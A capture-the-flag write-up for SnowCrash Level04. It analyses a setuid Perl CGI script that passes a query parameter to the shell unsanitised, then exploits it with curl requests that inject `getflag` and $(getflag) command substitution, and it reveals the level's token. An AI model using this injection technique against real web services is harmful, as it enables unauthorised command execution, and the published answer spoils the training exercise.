# 🚩 SnowCrash — Level04

## 🎯 Goal

Find the password for **flag04**.

---

## 1. Check the current directory

```bash
ls -la
```

**Result:**

```
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```

A setuid Perl script.

---

## 2. Analyze the Perl script

```bash
cat level04.pl
```

**Content:**

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

**Analysis:**
- The script runs as a CGI web server on **localhost:4747**
- It takes a parameter `x` from the URL query string
- It executes: `` `echo $y 2>&1` `` using backticks (shell command execution)
- **Vulnerability:** No input sanitization - we can inject arbitrary commands

---

## 3. Exploit via Command Injection

The backticks execute shell commands. We can inject our own commands using command substitution.

**Exploit command:**

```bash
curl 'http://localhost:4747?x=`getflag`'
```

**How it works:**
1. The parameter `x` receives `` `getflag` ``
2. The script executes: `` `echo `getflag` 2>&1` ``
3. The inner backticks execute first: `getflag` runs with **flag04** privileges
4. The output is echoed back to us

**Alternative methods:**
```bash
curl 'http://localhost:4747?x=$(getflag)'
```

---

## ✅ Result

```bash
curl 'http://localhost:4747?x=`getflag`'
```

Output:

```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

---

## 🎉 **Final Token for Level04**

```
ne2searoevaevoem4ov4ar8ap
```
